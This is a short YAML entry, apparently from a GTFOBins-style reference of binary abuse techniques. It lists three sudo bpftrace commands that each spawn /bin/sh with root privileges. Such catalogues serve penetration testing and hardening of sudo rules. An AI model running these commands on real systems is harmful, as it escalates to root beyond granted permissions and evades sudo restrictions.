---
functions:
  sudo:
    - code: sudo bpftrace -e 'BEGIN {system("/bin/sh");exit()}'
    - code: |
        TF=$(mktemp)
        echo 'BEGIN {system("/bin/sh");exit()}' >$TF
        sudo bpftrace $TF
    - code: sudo bpftrace -c /bin/sh -e 'END {exit()}'
---
